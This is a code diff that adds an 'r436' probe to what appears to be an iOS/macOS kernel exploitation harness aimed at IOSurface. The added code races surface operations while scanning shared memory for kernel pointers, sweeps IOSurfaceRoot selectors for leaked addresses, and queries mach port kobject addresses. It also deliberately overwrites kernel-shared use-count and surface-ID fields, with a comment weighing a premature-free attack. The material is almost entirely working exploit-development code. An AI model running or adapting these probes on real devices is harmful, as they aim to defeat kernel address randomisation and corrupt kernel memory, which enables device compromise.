@@ -16760,6 +16760,335 @@ static void r428_sighandler(int sig) {
  * surf pointer itself) for any kernel pointers or interesting data.
  */
 
+/* r436 shared data race globals */
+static volatile int g_r436_race_running = 0;
+static volatile int g_r436_kptr_found = 0;
+static uint64_t g_r436_kptrs[64];
+static int g_r436_kptr_offsets[64];
+static int g_r436_kptr_count = 0;
+
+static void *r436_monitor_thread(void *arg) {
+    uint64_t *shared = (uint64_t*)arg;
+    uint64_t snapshot[20];
+    while (g_r436_race_running) {
+        for (int i = 0; i < 20; i++) {
+            snapshot[i] = shared[i];
+        }
+        for (int i = 0; i < 20; i++) {
+            if ((snapshot[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                if (g_r436_kptr_count < 64) {
+                    g_r436_kptrs[g_r436_kptr_count] = snapshot[i];
+                    g_r436_kptr_offsets[g_r436_kptr_count] = i * 8;
+                    g_r436_kptr_count++;
+                    g_r436_kptr_found = 1;
+                }
+            }
+        }
+    }
+    return NULL;
+}
+
+static void r436_probe(void) {
+    rlog("\n=== r436: Shared Data Race + IOSurfaceRoot Selectors + Port Enum ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Shared data race monitor during kernel operations */
+    rlog("  --- Vector A: Shared data race monitor ---\n");
+    {
+        int aw = 32, ah = 32, abr = 128, aa = 4096, apf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef an[5];
+        an[0] = CFNumberCreate(NULL, kCFNumberIntType, &aw);
+        an[1] = CFNumberCreate(NULL, kCFNumberIntType, &ah);
+        an[2] = CFNumberCreate(NULL, kCFNumberIntType, &abr);
+        an[3] = CFNumberCreate(NULL, kCFNumberIntType, &aa);
+        an[4] = CFNumberCreate(NULL, kCFNumberIntType, &apf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), an[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), an[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), an[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), an[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), an[4]);
+        IOSurfaceRef asurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(an[i]);
+
+        if (asurf) {
+            void *shrp = *(void**)((char*)asurf + 8);
+            if (shrp) {
+                g_r436_race_running = 1;
+                g_r436_kptr_count = 0;
+                g_r436_kptr_found = 0;
+
+                pthread_t mon_thread;
+                pthread_create(&mon_thread, NULL, r436_monitor_thread, shrp);
+
+                /* Hammer kernel operations while monitoring shared data */
+                rlog("    Running race: SetValue/CopyValue/RemoveValue x 5000...\n");
+                for (int i = 0; i < 5000; i++) {
+                    int val = i;
+                    CFNumberRef vn = CFNumberCreate(NULL, kCFNumberIntType, &val);
+                    IOSurfaceSetValue(asurf, CFSTR("race_key"), vn);
+                    CFRelease(vn);
+                    CFTypeRef rv = IOSurfaceCopyValue(asurf, CFSTR("race_key"));
+                    if (rv) CFRelease(rv);
+                    IOSurfaceRemoveValue(asurf, CFSTR("race_key"));
+                }
+
+                /* Also do Lock/Unlock cycles */
+                rlog("    Running race: Lock/Unlock x 2000...\n");
+                for (int i = 0; i < 2000; i++) {
+                    IOSurfaceLock(asurf, 0, NULL);
+                    IOSurfaceUnlock(asurf, 0, NULL);
+                }
+
+                /* MachPort create/destroy */
+                rlog("    Running race: MachPort create/destroy x 1000...\n");
+                for (int i = 0; i < 1000; i++) {
+                    mach_port_t mp = IOSurfaceCreateMachPort(asurf);
+                    if (mp != MACH_PORT_NULL)
+                        mach_port_deallocate(mach_task_self(), mp);
+                }
+
+                /* Purgeable state transitions */
+                rlog("    Running race: Purgeable transitions x 1000...\n");
+                uint32_t old;
+                for (int i = 0; i < 1000; i++) {
+                    IOSurfaceSetPurgeable(asurf, kIOSurfacePurgeableVolatile, &old);
+                    IOSurfaceSetPurgeable(asurf, kIOSurfacePurgeableNonVolatile, &old);
+                }
+
+                g_r436_race_running = 0;
+                pthread_join(mon_thread, NULL);
+
+                rlog("    Race complete. KPTRs found: %d\n", g_r436_kptr_count);
+                for (int i = 0; i < g_r436_kptr_count && i < 20; i++) {
+                    rlog("      +%d: 0x%016llx\n", g_r436_kptr_offsets[i],
+                         (unsigned long long)g_r436_kptrs[i]);
+                }
+            }
+            CFRelease(asurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: IOSurfaceRootUserClient selectors with struct output */
+    rlog("\n  --- Vector B: IOSurfaceRoot selectors with struct output ---\n");
+    {
+        io_connect_t rootConn = 0;
+        io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &rootConn);
+        IOObjectRelease(svc);
+        rlog("    IOSurfaceRoot connection: 0x%x (kr=%d)\n", rootConn, kr);
+
+        if (rootConn) {
+            /* Create a surface to get its ID */
+            int bw = 32, bh = 32, bbr = 128, ba = 4096, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            IOSurfaceRef bsurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(bn[i]);
+
+            uint32_t bsid = bsurf ? IOSurfaceGetID(bsurf) : 0;
+            rlog("    Test surface id=%u\n", bsid);
+
+            /* Try selectors 0-30 with surface ID as scalar, large struct output */
+            for (uint32_t sel = 0; sel <= 30; sel++) {
+                uint64_t scIn[2] = {bsid, 0};
+                uint64_t scOut[16] = {0};
+                uint32_t scOutCnt = 16;
+                uint8_t stOut[4096];
+                memset(stOut, 0, sizeof(stOut));
+                size_t stOutSz = sizeof(stOut);
+
+                kr = IOConnectCallMethod(rootConn, sel,
+                    scIn, 1, NULL, 0,
+                    scOut, &scOutCnt, stOut, &stOutSz);
+
+                if (kr == 0) {
+                    rlog("    sel %u: OK sc_out=%u st_out=%zu\n", sel, scOutCnt, stOutSz);
+                    /* Check scalar output for kernel pointers */
+                    for (uint32_t i = 0; i < scOutCnt; i++) {
+                        if ((scOut[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      *** KPTR scalar[%u]: 0x%016llx ***\n", i,
+                                 (unsigned long long)scOut[i]);
+                        } else if (scOut[i] != 0) {
+                            rlog("      scalar[%u]: 0x%016llx\n", i, (unsigned long long)scOut[i]);
+                        }
+                    }
+                    /* Check struct output */
+                    if (stOutSz > 0) {
+                        uint64_t *sq = (uint64_t*)stOut;
+                        for (size_t i = 0; i < stOutSz / 8; i++) {
+                            if ((sq[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("      *** KPTR struct[%zu]: 0x%016llx ***\n", i,
+                                     (unsigned long long)sq[i]);
+                            }
+                        }
+                        rlog("      First 4 struct qwords: 0x%016llx 0x%016llx 0x%016llx 0x%016llx\n",
+                             (unsigned long long)sq[0], (unsigned long long)sq[1],
+                             (unsigned long long)sq[2], (unsigned long long)sq[3]);
+                    }
+                } else if (sel <= 5) {
+                    rlog("    sel %u: kr=%d (0x%x)\n", sel, kr, kr);
+                }
+            }
+
+            if (bsurf) CFRelease(bsurf);
+            IOServiceClose(rootConn);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: Enumerate all mach ports, check for leaked kernel data */
+    rlog("\n  --- Vector C: Mach port enumeration ---\n");
+    {
+        mach_port_name_array_t names = NULL;
+        mach_msg_type_number_t namesCnt = 0;
+        mach_port_type_array_t types = NULL;
+        mach_msg_type_number_t typesCnt = 0;
+
+        kern_return_t kr_pn = mach_port_names(mach_task_self(), &names, &namesCnt, &types, &typesCnt);
+        rlog("    mach_port_names: kr=%d count=%u\n", kr_pn, namesCnt);
+
+        if (kr_pn == 0 && namesCnt > 0) {
+            int kptr_in_ports = 0;
+            for (uint32_t i = 0; i < namesCnt && i < 200; i++) {
+                /* Check kobject for each port */
+                unsigned int kotype = 0;
+                mach_vm_address_t kaddr = 0;
+                kern_return_t kr2 = mach_port_kobject(mach_task_self(), names[i], &kotype, &kaddr);
+                if (kr2 == 0 && kaddr != 0) {
+                    rlog("      port 0x%x: kobject type=%u addr=0x%llx ***\n",
+                         names[i], kotype, (unsigned long long)kaddr);
+                    kptr_in_ports++;
+                }
+
+                /* Check context */
+                mach_port_context_t ctx = 0;
+                kern_return_t kr3 = mach_port_get_context(mach_task_self(), names[i], &ctx);
+                if (kr3 == 0 && ctx != 0 &&
+                    (ctx & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      port 0x%x: context=0x%llx *** KPTR ***\n",
+                         names[i], (unsigned long long)ctx);
+                    kptr_in_ports++;
+                }
+            }
+            rlog("    Ports with kernel data: %d (checked %u/%u)\n",
+                 kptr_in_ports, namesCnt > 200 ? 200 : namesCnt, namesCnt);
+
+            vm_deallocate(mach_task_self(), (vm_address_t)names, namesCnt * sizeof(*names));
+            vm_deallocate(mach_task_self(), (vm_address_t)types, typesCnt * sizeof(*types));
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: Direct write to shared data use count field, test kernel behavior */
+    rlog("\n  --- Vector D: Shared data direct write to use count ---\n");
+    {
+        int dw = 32, dh = 32, dbr = 128, da = 4096, dpf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef dn[5];
+        dn[0] = CFNumberCreate(NULL, kCFNumberIntType, &dw);
+        dn[1] = CFNumberCreate(NULL, kCFNumberIntType, &dh);
+        dn[2] = CFNumberCreate(NULL, kCFNumberIntType, &dbr);
+        dn[3] = CFNumberCreate(NULL, kCFNumberIntType, &da);
+        dn[4] = CFNumberCreate(NULL, kCFNumberIntType, &dpf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), dn[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), dn[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), dn[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), dn[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), dn[4]);
+        IOSurfaceRef dsurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(dn[i]);
+
+        if (dsurf) {
+            uint64_t *shrp = (uint64_t*)*(void**)((char*)dsurf + 8);
+            if (shrp) {
+                /* Record initial state */
+                rlog("    Initial shared[+8] (use count): 0x%016llx\n",
+                     (unsigned long long)shrp[1]);
+
+                /* Write a large value directly to use count */
+                shrp[1] = 0x7FFFFFFFULL;
+                int32_t uc = IOSurfaceGetUseCount(dsurf);
+                rlog("    After write 0x7FFFFFFF: GetUseCount=%d\n", uc);
+
+                /* Try setting it to a value that looks like a kernel pointer */
+                shrp[1] = 0xFFFFFFF007C00000ULL;
+                uc = IOSurfaceGetUseCount(dsurf);
+                rlog("    After write kptr-like: GetUseCount=%d (0x%x)\n", uc, uc);
+
+                /* Reset and try kernel operations */
+                shrp[1] = 0;
+
+                /* Write to refcount field (+0) */
+                uint64_t orig_refcount = shrp[0];
+                rlog("    Original refcount (+0): 0x%016llx\n", (unsigned long long)orig_refcount);
+
+                /* Try setting refcount to 0 — might trigger premature free */
+                /* DON'T do this — too dangerous, could crash */
+
+                /* Instead, try writing to fields we know the kernel reads */
+                /* Write to +136 (surface ID) and check if kernel updates */
+                uint64_t orig_136 = shrp[17]; /* +136 / 8 = 17 */
+                rlog("    Original +136 (sid): 0x%016llx\n", (unsigned long long)orig_136);
+
+                /* Corrupt +136 to 0, then do SetValue — does kernel use the old or new ID? */
+                uint32_t real_sid = IOSurfaceGetID(dsurf);
+                shrp[17] = 0;
+                rlog("    After zeroing +136: GetID=%u (should be %u)\n",
+                     IOSurfaceGetID(dsurf), real_sid);
+
+                /* SetValue with zeroed SID */
+                int tval = 99999;
+                CFNumberRef tvn = CFNumberCreate(NULL, kCFNumberIntType, &tval);
+                IOSurfaceSetValue(dsurf, CFSTR("test_zero_sid"), tvn);
+                CFRelease(tvn);
+                CFTypeRef rb = IOSurfaceCopyValue(dsurf, CFSTR("test_zero_sid"));
+                if (rb) {
+                    int rv = 0;
+                    CFNumberGetValue(rb, kCFNumberIntType, &rv);
+                    rlog("    SetValue/CopyValue with zeroed SID: got %d\n", rv);
+                    CFRelease(rb);
+                } else {
+                    rlog("    SetValue/CopyValue with zeroed SID: NULL\n");
+                }
+
+                /* Restore SID */
+                shrp[17] = orig_136;
+
+                /* Now check: after all these writes, did the kernel write any new data? */
+                rlog("    Final shared data dump:\n");
+                for (int i = 0; i < 20; i++) {
+                    if (shrp[i] != 0)
+                        rlog("      +%d: 0x%016llx\n", i*8, (unsigned long long)shrp[i]);
+                }
+            }
+            CFRelease(dsurf);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r436 complete ===\n");
+    fflush(stdout);
+}
+
 static void r435_probe(void) {
     rlog("\n=== r435: MachPort + Timing Oracle + UseCount + Surface Port Kobject ===\n\n");
     fflush(stdout);
@@ -75957,6 +76286,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 439) {
+            rlog("*** rounds=439: Shared Data Race + IOSurfaceRoot Selectors + Port Enum ***\n\n");
+            fflush(stdout);
+            r436_probe();
+            goto done;
+        }
         if (rounds == 438) {
             rlog("*** rounds=438: MachPort + Timing Oracle + UseCount + Surface Scan ***\n\n");
             fflush(stdout);
@@ -78611,7 +78946,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
